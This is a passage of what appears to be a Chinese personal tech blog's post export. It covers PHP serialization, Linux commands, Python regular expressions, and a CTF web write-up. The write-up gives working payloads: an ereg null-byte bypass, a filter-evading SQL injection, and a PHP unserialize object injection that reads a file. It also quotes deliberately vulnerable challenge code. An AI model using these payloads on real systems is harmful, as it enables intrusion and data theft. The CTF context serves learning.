string(4) &quot;b:1;&quot; string(4) &quot;b:0;&quot; 解释： b 表示布尔类型 1 表示布尔变量的值为true 0 表示布尔类型的值为false null类型的序列化格式&lt;?php $null = null; var_dump(serialize($null)); ?&gt; 输出结果： string(2) &quot;N;&quot; 解释 N 代表的null类型 数组类型的序列化格式&lt;?php $arr = array(&#39;a&#39; =&gt; 1, &#39;b&#39; =&gt; 2); var_dump(serialize($arr)); echo &quot;&lt;br&gt;&quot;; ?&gt; 输出结果： string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; 解释： a 表示array类型 2 表示数组的长度 {} 内的时数组各个值得类型，长度以及值 类的序列化格式&lt;?php class chuddy { public $data; private $pass; public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } } $cc = new chuddy(&#39;chuddy&#39;, &#39;haha&#39;); var_dump(serialize($cc)); ?&gt; 输出结果为： string(72) &quot;O:6:&quot;chuddy&quot;:2:{s:4:&quot;data&quot;;s:6:&quot;chuddy&quot;;s:12:&quot;chuddypass&quot;;s:4:&quot;haha&quot;;}&quot; 解释： O 代表对象类型 2 代表类里的变量多少 序列化对象class CB { public $CB_data = &#39;cb&#39;; } class CC extends CB{ const SECOND = 60; public $data; private $pass; public function __construct($data, $pass) { $this-&gt;data = $data; $this-&gt;pass = $pass; } public function setPass($pass) { $this-&gt;pass = $pass; } } $cc = new CC(&#39;uu&#39;, true); var_dump(serialize($cc)); 输出结果为： string(75) &quot;O:2:&quot;CC&quot;:3:{s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:8:&quot; CC pass&quot;;b:1;s:7:&quot;CB_data&quot;;s:2:&quot;cb&quot;;}&quot; 序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。 对象序列化自定义在序列化对象时，有一些敏感数据，我们不需要保存，这里该如何处理呢 在我们调用serialize()函数时，该函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化的操作。可以通过重载这个方法，从而自定义序列化行为 class User{ const SITE = &#39;uusama&#39;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 重载序列化调用的方法 public function __sleep() { // 返回需要序列化的变量名，过滤掉password变量 return array(&#39;username&#39;, &#39;nickname&#39;); } } $user = new User(&#39;uusama&#39;, &#39;uu&#39;, &#39;123456&#39;); var_dump(serialize($user)); 返回结果为： string(67) &quot;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&quot; 这样就忽略了password字段的值 可以保护敏感数据 总结所以序列化对于不同类型得到的字符串格式为： String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;(repeated per element)} Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} 反序列化反序列化函数unserialize()反序列化函数用于将单一的已序列化的变量转换回PHP的值注意： 如果传递的字符串不可解序列化，则返回false，并产生一个E_NOTICE 返回的是转换之后的值，可为integer、float、string、array或object 若被反序列化的变量时一个对象，在成功重新构造对象之后，PHP会自动的试图去调用__wakeup()成员函数（如果存在的话） class User{ const SITE = &#39;uusama&#39;; public $username; public $nickname; private $password; public function __construct($username, $nickname, $password) { $this-&gt;username = $username; $this-&gt;nickname = $nickname; $this-&gt;password = $password; } // 重载序列化调用的方法 public function __sleep() { // 返回需要序列化的变量名，过滤掉password变量 return array(&#39;username&#39;, &#39;nickname&#39;); } public function __wakeup() { $this-&gt;password = $this-&gt;username; } } $user_ser = &#39;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&#39;; var_dump(unserialize($user_ser)) 输出结果： object(User)#3 (3) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(6) &quot;uusama&quot; } 我也尝试了一下没有__wakeup()的情况 输出结果为： object(User)#3 (3) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; NULL } __wakeup()函数在对象被构建以后执行，所以$this-&gt;username的值不为空 反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象 未定义的类的处理$user_ser = &#39;O:4:&quot;haha&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&#39;; var_dump(unserialize($user_ser)); echo &quot;&lt;br&gt;&quot;; haha这个类是没有定义的 但是还能正常输出 没有报错 输出结果为： object(__PHP_Incomplete_Class)#3 (3) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(4) &quot;haha&quot; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; } 有两种方案进行修复 定义__autoload()等函数，指定发现未定义类时加载类的定义文件 可通过 php.ini、ini_set() 或 .htaccess 定义unserialize_callback_func。每次实例化一个未定义类时它都会被调用 // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&#39;unserialize_callback_func&#39;, &#39;mycallback&#39;); // 设置您的回调函数 function mycallback($classname) { // 只需包含含有类定义的文件 // $classname 指出需要的是哪一个类 } // 建议使用下面的函数，代替__autoload() spl_autoload_register(function ($class_name) { // 动态加载未定义类的定义文件 require_once $class_name . &#39;.php&#39;; }); 附上参考链接 http://uusama.com/663.html","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"linux的基本操作","slug":"linux的基本操作","date":"2018-12-09T08:20:04.000Z","updated":"2019-05-29T12:32:10.074Z","comments":true,"path":"2018/12/09/linux的基本操作/","link":"","permalink":"http://yoursite.com/2018/12/09/linux的基本操作/","excerpt":"","text":"linuxLinux 文件系统是一个目录树的结构，文件系统结构从一个根目录开始，根目录下可以有任意多个文件和子目录，子目录中又可以有任意多个文件和子目录 bin 存放二进制可执行文件(ls,cat,mkdir等) boot 存放用于系统引导时使用的各种文件 dev 用于存放设备文件 etc 存放系统配置文件 home 存放所有用户文件的根目录 lib 存放跟文件系统中的程序运行所需要的共享库及内核模块 mnt 系统管理员安装临时文件系统的安装点 opt 额外安装的可选应用程序包所放置的位置 proc 虚拟文件系统，存放当前内存的映射 root 超级用户目录 sbin 存放二进制可执行文件，只有root才能访问 tmp 用于存放各种临时文件 usr 用于存放系统应用程序，比较重要的目录/usr/local 本地管理员软件安装目录 var 用于存放运行时需要改变数据的文件 对目录的操作lsls -a 可以显示全部文档 包括隐藏文档都会背一起列出来 ls -d 仅仅列出目录本身 而不是列出目录内的文件数据 ls -l 可以显示 文件的属性与权限等等 其中这些在后面可以见 地址来列出 其他文件的信息 ls -al /var/www 显示为 www目录下的文件信息 drwxr-xr-x 3 root root 4096 3月 19 22:36 . drwxr-xr-x 15 root root 4096 3月 19 20:39 .. drwxr-xr-x 3 root root 4096 3月 20 19:37 html lrwxrwxrwx 1 root root 21 3月 19 22:36 phpmyadmin -&gt; /usr/share/phpmyadmin pwd显示目录所在位置 mkdirmkdir 目录名 创建新目录 mkdir -p /text1/text2/text3/text4 可以递归创建你所需要的目录 mkdir -m 711 text2 创建权限为rwx--x--x 的目录 rmdirrmdir 目录名 删除空目录 rmdir -p 目录名 连同上一级空的目录也一起删除 cp拷贝文件和目录 cp 参数 来源位置 目标位置 参数如下： -a：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用) -d：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身； -f：为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次； -i：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用) -l：进行硬式连结(hard link)的连结档创建，而非复制文件本身； -p：连同文件的属性一起复制过去，而非使用默认属性(备份常用)； -r：递归持续复制，用於目录的复制行为；(常用) -s：复制成为符号连结档 (symbolic link)，亦即『捷径』文件； -u：若 destination 比 source 旧才升级 destination ！ rmrm [-fir] 文件或目录 -f : 就是force的意思，忽略不存在的文件，不会有警告信息 -i : 互动模式，在删除前会询问使用者的意见 -r : 递归删除。最常见的是在目录里面删除了，比较危险 mv(移动文件或目录，或修改名称)mv 文件 目录 把文件移动到目录下 mv 目录名字 目录新名字 目录该名称 Linux文件内容查看cat 由第一行开始显示文件内容 tac 有最后一行开始显示文件内容 nl 显示的时候，顺着输出行号 more 一页一页的显示文件内容 less 与more相似，但比more更好的是可以向前翻页 head 只看头几行 tail 只看尾几行 cat-b 列出行号，仅针对非空白行做行号显示，空白行不标行号 head tailhead -n 10 1.txt 显示1.txt头十行的内容 tail -n 10 1.txt 显示1.txt尾巴十行的内容 Linux磁盘管理df : 列出文件系统的整体磁盘使用量 du : 检查磁盘空间使用量 fdisk : 用于磁盘分区 df常见的参数 -a : 列出所有的文件系统，包括系统特有的文件系统 -k : 以KBytes的容量来显示各文件系统 -m : 以MBytes的容量来显示各文件系统 -h : 艺人们较易阅读的格式自行显示 -H : 以M=1000K 取代 M=1024k 的进位方式 -T : 显示文件系统类型，连同该partitio的filesystem名称也列出 -i : 不用硬盘容量，而以inode的数量来显示 du常见的参数 -a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。 -h ：以人们较易读的容量格式 (G/M) 显示； -s ：列出总量而已，而不列出每个各别的目录占用容量； -S ：不包括子目录下的总计，与 -s 有点差别。 -k ：以 KBytes 列出容量显示； -m ：以 MBytes 列出容量显示； 特殊符号表特殊符号 代表意义 [:alnum:] 代表英文大小写字符及数字，亦即 0-9, A-Z, a-z [:alpha:] 代表任何英文大小写字符，亦即 A-Z, a-z [:blank:] 代表空格键不 [Tab] 按键两者 [:cntrl:] 代表键盘上面的控制按键，亦即包括 CR, LF, Tab, Del.. 等等 [:digit:] 代表数字而已，亦即 0-9 [:graph:] 除了空格符 (空格键不 [Tab] 按键) 外的其他所有按键 [:lower:] 代表小写字符，亦即 a-z [:print:] 代表任何可以被打印出来的字符 [:punct:] 代表标点符号 (punctuation symbol)，亦即：” ‘ ? ! ; : # $… [:upper:] 代表大写字符，亦即 A-Z [:space:] 任何会产生空白的字符，包括空格键, [Tab], CR 等等 [:xdigit:] 代表 16 进位的数字类型，因此包括： 0-9, A-F, a-f 的数字不字符 grep进阶的选项与参数[root@www ~]# grep [-acinv] [--color=auto] &#39;搜寻字符串&#39; filename 选项与参数： -a ：将 binary 档案以 text 档案的方式搜寻数据 -c ：计算找到 &#39;搜寻字符串&#39; 的次数 -i ：忽略大小写的不同，所以大小写视为相同 -n ：顺便输出行号 -v ：反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！ --color=auto ：可以将找到的关键词部分加上颜色的显示！ -A ：后面可加数字，为 after 的意思，除了列出该行外，后续的 n 行也列出来； -B ：后面可加数字，为 befer 的意思，除了列出该行外，前面的 n 行也列出 练习1.搜索特定字符 cat 1.txt| grep -n &#39;chuddy&#39; grep -n &#39;chuddy&#39; 1.txt # 才知道grep可以直接获得文件的内容，然后进行分析 grep -vn &#39;chuddy&#39; 1.txt 利用中括号[]来搜寻集合字符 grep -n &#39;t[ae]st&#39; chuddy.txt grep -n &#39;[^g]oo&#39; chuddy.txt grep -n &#39;[^a-z]oo&#39; chuddy.txt grep -n &#39;[0-9]&#39; chuddy.txt grep -n &#39;[^[:lower:]]oo&#39; chuddy.txt grep -n &#39;[[:digit:]]&#39; chuddy.txt 3.行首与行尾字符(^ $) 行首(^) grep -n &#39;^the&#39; chuddy.txt grep -n &#39;^[a-z]&#39; chuddy.txt grep -n &#39;^[[:lower:]]&#39; chuddy.txt grep -n &#39;^[^a-zA-Z]&#39; chuddy.txt 行尾($) 找出行尾为‘.’的行。 grep -n &#39;\\.$&#39; chuddy.txt 找出空白行 grep -n &#39;^$&#39; chuddy.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"nnctf writeup","slug":"nnctf-writeup","date":"2018-12-08T15:14:44.000Z","updated":"2019-05-29T12:32:53.008Z","comments":true,"path":"2018/12/08/nnctf-writeup/","link":"","permalink":"http://yoursite.com/2018/12/08/nnctf-writeup/","excerpt":"南宁nnctf web wp","text":"南宁nnctf web wp 超简单打开发现给出了源码 &lt;?php $white_list = range(0,9); require_once(&#39;flag.php&#39;); if(isset($_REQUEST[&#39;no&#39;])){ $a=$_REQUEST[&#39;no&#39;]; if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE){ echo &#39;no must be number&#39;; }else{ if(in_array($a,$white_list)){ if(strlen($a)&gt;1){ echo &#39;you are a great dark phper&lt;br&gt;&#39;; echo &quot;&lt;img src=&#39;dark.gif&#39;&gt;&lt;br&gt;&quot;; echo $flag; }else{ echo &#39;you no dark&#39;; } }else{ echo &#39;you are so dark&#39;; } } }else highlight_file(__FILE__); 代码分析： 传递了一个no参数 正则匹配 只能是数字 设置了白名单 长度大于一 playload: ?no=1%00 sql?这个是一个源码泄露但是因为工具的原名跑不出来源码 网上用大佬的工具跑出来了 &lt;?php $flag = &#39;gxnnctf{***************************}&#39;; require_once(&#39;config.php&#39;); $conn = new mysqli($db_servername,$db_username,$db_password,$db_name); if($conn-&gt;connect_error){ die(&quot;Connect failed:&quot;.$conn-&gt;connect_error); } if(isset($_GET[&#39;id&#39;])){ $id = $_GET[&#39;id&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$id)) die(&#39;Don\\&#39;t hurt me :-(&#39;); $sql = &quot;select username from user where id = &quot;.$id; $result = $conn-&gt;query($sql); if($result){ $row = $result-&gt;fetch_array(); }else{ echo mysqli_error($conn); die(); } echo(&#39;hello &#39;.$row[&#39;username&#39;].&#39;&lt;br&gt;&#39;); $username = $row[&#39;username&#39;]; if($username === &#39;guest&#39;){ $ip = @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]!=&quot;&quot; ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$ip)){ die(&#39;Don\\&#39; hack me&#39;); } if(!empty($ip)){ echo &#39;you from &#39;.$ip.&#39; , I remembered it.&lt;br&gt;&#39;; $conn-&gt;query(&quot;insert into logs(ip) values(&#39;$ip&#39;)&quot;); } $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;admin&#39;){ var_dump($_GET[&#39;backdoor&#39;]); if(isset($_GET[&#39;backdoor&#39;])&amp;&amp;$_GET[&#39;backdoor&#39;]===&#39;Melonrind&#39;){ echo &#39;you find the backdoor!!!&lt;br&gt;&#39;; die($flag); }else{ echo &quot;you are so great,but you don\\&#39;t have backdoor,so continue to challenge :(&quot;; } }else{ echo &quot;but i don\\&#39;t waiting for you &quot;; } }else{ echo &#39;emmmmm&#39;; } }else{ echo &#39;welcome to gxnnctf2018!&lt;br&gt;&#39;; echo &#39;i filtered everything,so have a good time :)&#39;; } 分析代码： $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;guest&#39;){ $ip = @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]!=&quot;&quot; ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]; if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&#39;,$ip)){ die(&#39;Don\\&#39; hack me&#39;); } if(!empty($ip)){ echo &#39;you from &#39;.$ip.&#39; , I remembered it.&lt;br&gt;&#39;; $conn-&gt;query(&quot;insert into logs(ip) values(&#39;$ip&#39;)&quot;); } $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&#39;username&#39;]; if($username === &#39;admin&#39;){ var_dump($_GET[&#39;backdoor&#39;]); if(isset($_GET[&#39;backdoor&#39;])&amp;&amp;$_GET[&#39;backdoor&#39;]===&#39;Melonrind&#39;){ echo &#39;you find the backdoor!!!&lt;br&gt;&#39;; die($flag); 这些能够得到flag 进行第一次的select语句 查询结果是2 也就是guest 才能进行下列的操作 然后进行第二次的查询语句 如果结果为1 也就是admin get传递参数backdoor === Melonrind 这样才能显示flag 发现这个过滤了好多东西 常用的注入都不能进行了 后来看别人的writeup 使用了 case when then end 的查询 类似这样能得到两个我们所需要的结果 但是因为过滤了空格 我们可以使用%20代替 于是构建playload: ?id=case%20when%20@a%20is%20null%20then%20@a:=2%20else%20@a:=@a-1%20end&amp;backdoor=Melonrind 这样就能得到flag web进入题目发现源代码： &lt;?php //include(&quot;./class.php&quot;); header(&quot;content-type:text/html;charset=utf-8&quot;); error_reporting(0); if(isset($_GET[&quot;file&quot;])){ $file = $_GET[&quot;file&quot;]; if(isset($_GET[&quot;password&quot;])){ $password = $_GET[&quot;password&quot;]; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ require_once($file); highlight_file(&quot;$file&quot;); $password = unserialize($password); echo $password; } }else{ echo &quot;需要密码的！&lt;br&gt;&quot;; } }else{ highlight_file(&#39;./index.php&#39;); } if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } ?&gt; 可见是代码审计。 提示class.php故get传参file=class.php看到需要密码，继续传参password=1（任意值）发现class.php的源码： &lt;!-- hello friend! --&gt; &lt;?php class Flag{//flag_good.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&lt;br&gt;&quot;); } } } ?&gt; 根据两个代码和提示flag_good.php，构造playload: ?file=class.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:13:&quot;flag_good.php&quot;;} 得到flag： flag{132e9a8fcba14cbbaaad09c76d15bd07}","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"python正则表达式","slug":"python正则表达式","date":"2018-11-08T16:36:18.000Z","updated":"2019-05-29T12:45:04.711Z","comments":true,"path":"2018/11/09/python正则表达式/","link":"","permalink":"http://yoursite.com/2018/11/09/python正则表达式/","excerpt":"Python正则表达式","text":"Python正则表达式 正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。 re 模块，它提供Perl风格的正则表达式模式。使 Python语言拥有全部的正则表达式功能。 compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 re模块re.match函数re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法： re.match(pattern,string,flags=0) 参数说明： pattern: 匹配正则表达式 strung：要匹配的字符 flags：标志位，用于控制正则表达式的匹配方式，如是否区分大小写，多行匹配等等 匹配成功re.match方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 group(num=0) 匹配的整个表达式的字符串，group()可以一次输入多个组号,在这种情况下它将返回一个包含那些组所对值得元组 groups() 返回一个包含所有小组字符串的元组，从1到所含的小组号 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I) if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2) else: print &quot;No match!!&quot; 以上实例执行结果如下： matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter 正则表达式修饰符 - 可选标志 re.l 使匹配对大小写不敏感 re.L 做本地化识别(locale-aware)匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使.匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解 re.search方法re.search：扫描整个字符串并返回第一个成功的匹配。 #!/usr/bin/python # -*- coding: UTF-8 -*- import re print(re.search(&#39;www&#39;, &#39;www.runoob.com&#39;).span()) # 在起始位置匹配 print(re.search(&#39;com&#39;, &#39;www.runoob.com&#39;).span()) # 不在起始位置匹配 以上实例运行输出结果为： (0, 3) (11, 14) #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; searchObj = re.search( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I) if searchObj: print &quot;searchObj.group() : &quot;, searchObj.group() print &quot;searchObj.group(1) : &quot;, searchObj.group(1) print &quot;searchObj.group(2) : &quot;, searchObj.group(2) else: print &quot;Nothing found!!&quot; 以上实例执行结果如下： searchObj.group() : Cats are smarter than dogs searchObj.group(1) : Cats searchObj.group(2) : smarter re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; matchObj = re.match( r&#39;dogs&#39;, line, re.M|re.I) if matchObj: print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; matchObj = re.search( r&#39;dogs&#39;, line, re.M|re.I) if matchObj: print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; 以上实例运行结果如下： No match!! search --&gt; matchObj.group() : dogs 检索和替换Python 的re模块提供了re.sub用于替换字符串中的匹配项。 语法： re.sub(pattern, repl, string, count=0, flags=0) 参数： - pattern : 正则中的模式字符串。 - repl : 替换的字符串，也可为一个函数。 - string :要被查找替换的原始字符串。 - count :模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 例子： #!/usr/bin/python # -*- coding: UTF-8 -*- import re phone = &quot;2004-959-559 # 这是一个国外电话号码&quot; # 删除字符串中的 Python注释 num = re.sub(r&#39;#.*$&#39;, &quot;&quot;, phone) print &quot;电话号码是: &quot;, num # 删除非数字(-)的字符串 num = re.sub(r&#39;\\D&#39;, &quot;&quot;, phone) print &quot;电话号码是 : &quot;, num 以上实例执行结果如下： 电话号码是: 2004-959-559 电话号码是 : 2004959559 repl 参数是一个函数的情况 #!/usr/bin/python # -*- coding: UTF-8 -*- import re def double(a): value = int(a.group(&#39;value&#39;)) print value return str(value * 2) s = &#39;asas55da546sdsa15661&#39; print(re.sub(&#39;(?P&lt;value&gt;\\d+)&#39;, double, s)) 输出结果 55 546 15661 asas110da1092sdsa31322 [Finished in 0.1s] re.compile()函数compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 re.compile(pattern[, flags]) 参数 - pattern: 一个字符串的正则表达式 - flags: 可选，表示匹配模式 - re.l 忽略大小写 - re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 - re.M 多行模式 - re.S 即为.并且包含换行符在内的任意符号（.不包括换行符） - re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 - re.X 为了增加可读性，忽略空格和 # 后面的注释 import re pattern = re.compile(r&#39;\\d+&#39;) m = pattern.match(&#39;one12twothree34four&#39;) # 查找头部，没有匹配 print m m = pattern.match(&#39;one12twothree34four&#39;, 2, 10) # 从&#39;e&#39;的位置开始匹配，没有匹配 print m m = pattern.match(&#39;one12twothree34four&#39;, 3, 10) # 从&#39;1&#39;的位置开始匹配，正好匹配 print m 三次输出的结果为： None None &lt;_sre.SRE_Match object at 0x0340E640&gt; # 可以看出当匹配成功时返回一个 Match 对象 # 这些可以接受对象的函数输出： print m.group(0) print m.start(0) print m.end(0) print m.span(0) #输出为： 12 3 5 (3, 5) group([group1,…])方法用于获得一个或多个分组匹配的字符串，当要获取整个匹配的子串时，可直接使用 group()或者group(0)； start([group]) 方法用于获取分组匹配的子串在整个整个字符串中起始的位置(子串第一个字符的索引)，参考默认值为0； end([group]) 方法用于获取分组匹配的子串在整个整个字符串中结束的位置(子串最后一个字符的索引+1)，参考默认值为0； span([group]) 方法返回 (start(group), end(group))。 import re pattern = re.compile(r&#39;([a-z]+) ([a-z]+) ([a-z]+)&#39;, re.I) m = pattern.match(&#39;Hello World Wide Web&#39;) print m.groups() # 等价于 (m.group(1), m.group(2), ...) print m.span(1) # 返回第一个分组匹配成功的子串的索引 输出结果： (&#39;Hello&#39;, &#39;World&#39;, &#39;Wide&#39;) (0, 5) [Finished in 0.1s] findall函数在字符串中找到正则表达式所匹配的所有子串，并返回到一个列表，如果没有找到匹配的，则返回空列表。 注意：match和search是匹配一次findall匹配所有 findall(string[, pos[, endpos]]) 参数 - string 待匹配的字符串 - pos 可选参数，指定字符串的起始位置，默认为0 - endpos 可选参数，指定字符串的结束位置，默认为字符串的长度 import re findnumber = &#39;ahsd5asdj656asd645asd&#39; pattern = re.compile(r&#39;\\d+&#39;) m = pattern.findall(findnumber) n = pattern.findall(findnumber,0,10) print m print n 输出结果： [&#39;5&#39;, &#39;656&#39;, &#39;645&#39;] [&#39;5&#39;, &#39;6&#39;] [Finished in 0.1s] re.finditer和 findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0) 实例 import re findnumber = &#39;ahsd5asdj656asd645asd&#39; p = re.finditer(r&#39;\\d+&#39;, findnumber) for a in p: print a.group() 输出为： 5 656 645 re.splitsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： re.split(pattern, string[, maxsplit=0, flags=0]) 参数： pattern 匹配的正则表达式 string 要匹配的字符串。 maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。 flags 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 b = re.split(&#39;(\\d+)&#39;, &#39; asd, 541sad, asd5.5415&#39;) print b 输出结果 [&#39; asd, &#39;, &#39;541&#39;, &#39;sad, asd&#39;, &#39;5&#39;, &#39;.&#39;, &#39;5415&#39;, &#39;&#39;] 正则表达式对象re.RegexObjectre.compile() 返回 RegexObject 对象。 re.MatchObjectgroup() 返回被 RE 匹配的字符串。 start() 返回匹配开始的位置 end() 返回匹配结束的位置 span() 返回一个元组包含匹配 (开始,结束) 的位置 正则表达式修饰符 re.I 使匹配对大小写不敏感 re.L 做本地化识别（locale-aware）匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使 . 匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 正则表达式模式 ^ 匹配字符串的开头 $ 匹配字符串的末尾。 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’ [^…] 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n} 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。 re{ n,} 匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。 re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式 a| b 匹配a或b (re) 匹配括号内的表达式，也表示一个组 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#…) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 (?&gt; re) 匹配的独立模式，省去回溯。 \\w 匹配字母数字及下划线 \\W 匹配非字母数字及下划线 \\s 匹配任意空白字符，等价于 [\\t\\n\\r\\f]. \\S 匹配任意非空字符 \\d 匹配任意数字，等价于 [0-9]. \\D 匹配任意非数字 \\A 匹配字符串开始 \\Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 \\z 匹配字符串结束 \\G 匹配最后匹配完成的位置。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\n, \\t, 等. 匹配一个换行符。匹配一个制表符。等 \\1…\\9 匹配第n个分组的内容。 \\10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"mysql 